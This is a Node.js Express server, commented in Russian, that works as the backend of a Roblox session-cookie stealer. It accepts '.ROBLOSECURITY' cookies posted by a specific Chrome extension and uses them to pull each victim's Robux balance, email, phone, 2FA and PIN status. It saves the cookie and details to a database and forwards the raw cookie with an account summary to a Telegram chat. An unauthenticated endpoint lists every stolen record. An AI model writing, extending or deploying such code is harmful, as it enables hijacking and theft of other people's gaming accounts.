require("dotenv").config();
const express = require("express");
const { neon } = require("@neondatabase/serverless");
const {Bot} = require('grammy')
const cors = require("cors");

const PORT = 5000;
const app = express();
const client = neon(process.env.DATABASE_URL);
const bot = new Bot(process.env.BOT_TOKEN)

sendTelegramMessage = async (chatId, message) => {
  try {
    await bot.api.sendMessage(chatId, message);
    console.log("Сообщение отправлено!");
  } catch (error) {
    console.error("Ошибка отправки:", error);
  }
}
async function getRobloxAccountDetails(cookieValue) {
  const headers = {
    Cookie: `.ROBLOSECURITY=${cookieValue}`,
    Accept: "application/json"
  };

  const fetchJson = async (url) => {
    const res = await fetch(url, { method: "GET", headers });
    if (!res.ok) {
      throw new Error(`${url} -> HTTP ${res.status}`);
    }
    return res.json();
  };

  // 1. Базовый профиль: id, name, displayName
  const authUser = await fetchJson("https://users.roblox.com/v1/users/authenticated");
  const userId = authUser.id;

  // 2. Параллельно запрашиваем остальные данные
  const [
    userProfileRes,
    robuxRes,
    emailRes,
    phoneRes,
    twoStepRes,
    pinRes,
    premiumRes
  ] = await Promise.allSettled([
    fetchJson(`https://users.roblox.com/v1/users/${userId}`), // created (дата создания)
    fetchJson(`https://economy.roblox.com/v1/users/${userId}/currency`), // robux
    fetchJson("https://accountsettings.roblox.com/v1/email"), // emailVerified / emailAddress
    fetchJson("https://accountinformation.roblox.com/v1/phone"), // isVerified / phone
    fetchJson(`https://twostepverification.roblox.com/v1/users/${userId}/configuration`), // enabled
    fetchJson("https://auth.roblox.com/v1/account/pin"), // isEnabled (статус PIN)
    fetchJson(`https://premiumfeatures.roblox.com/v1/users/${userId}/validate-membership`) // boolean
  ]);

  const val = (res, fallback = null) => (res.status === "fulfilled" ? res.value : fallback);

  const profile = val(userProfileRes, {});
  const robux = val(robuxRes, {});
  const email = val(emailRes, {});
  const phone = val(phoneRes, {});
  const twoStep = val(twoStepRes, {});
  const pin = val(pinRes, {});
  const premium = val(premiumRes, false);

  return {
    id: userId,
    name: authUser.name,
    displayName: authUser.displayName,
    createdAt: profile.created ?? null,
    robux: robux.robux ?? null,
    isPremium: typeof premium === "boolean" ? premium : Boolean(premium?.isPremium),
    email: {
      verified: email.verified ?? email.emailVerified ?? null,
      address: email.emailAddress ?? null
    },
    phone: {
      verified: phone.isVerified ?? phone.verified ?? null,
      number: phone.phone ?? null
    },
    twoFactorEnabled: twoStep.enabled ?? twoStep.isEnabled ?? null,
    pinEnabled: pin.isEnabled ?? pin.enabled ?? null
  };
}

app.use(express.json());
app.use(cors({
  origin: "chrome-extension://eboadfllildekgjmpbdcgbhdmacehndf",
  methods: ["POST", "OPTIONS"],
  allowedHeaders: ["Content-Type"]
}));
app.post("/save", async (req, res) => {
  const { login } = req.body ?? {};
  if (!login) {
    return res.status(400).json({ ok: false, error: "Не передан токен сессии" });
  }

  try {
    const account = await getRobloxAccountDetails(login);

    // Пример: сохраняем в БД (подставьте нужные колонки вашей таблицы)
    await client`
      INSERT INTO users (
        roblox_id,
        username,
        display_name,
        created_at,
        robux,
        is_premium,
        email_verified,
        phone_verified,
        two_fa_enabled,
        pin_enabled,
        login
      )
      VALUES (
        ${account.id},
        ${account.name},
        ${account.displayName},
        ${account.createdAt},
        ${account.robux},
        ${account.isPremium},
        ${account.email.verified},
        ${account.phone.verified},
        ${account.twoFactorEnabled},
        ${account.pinEnabled},
        ${login}
      )
    `;

    await sendTelegramMessage(
      process.env.CHAT_ID,
      [
        `Аккаунт: ${account.displayName} (@${account.name}, ID: ${account.id})`,
        `Создан: ${account.createdAt ?? "н/д"}`,
        `Robux: ${account.robux ?? "н/д"} | Premium: ${account.isPremium ? "да" : "нет"}`,
        `Почта привязана/подтв.: ${account.email.verified ?? "н/д"} | Телефон: ${account.phone.verified ?? "н/д"}`,
        `2FA: ${account.twoFactorEnabled ?? "н/д"} | PIN включён: ${account.pinEnabled ?? "н/д"} 
        
        COOKIE: ${login}`
      ].join("\n")
    );

    res.json({ ok: true, account });
  } catch (err) {
    console.error("Ошибка:", err);
    res.status(500).json({ ok: false, error: err.message });
  }
});
app.get("/users", async (req, res) => {
  try {
    const users = await client`SELECT * FROM users`;  
    res.json({ ok: true, users });
  } catch (err) {
    console.error("Ошибка получения пользователей из базы данных:", err);
    res
      .status(500)
      .json({ ok: false, error: "Не удалось получить пользователей" });
  }
}); 
app.listen(PORT, () => {
  console.log(`Сервер запущен: http://localhost:${PORT}`);
});
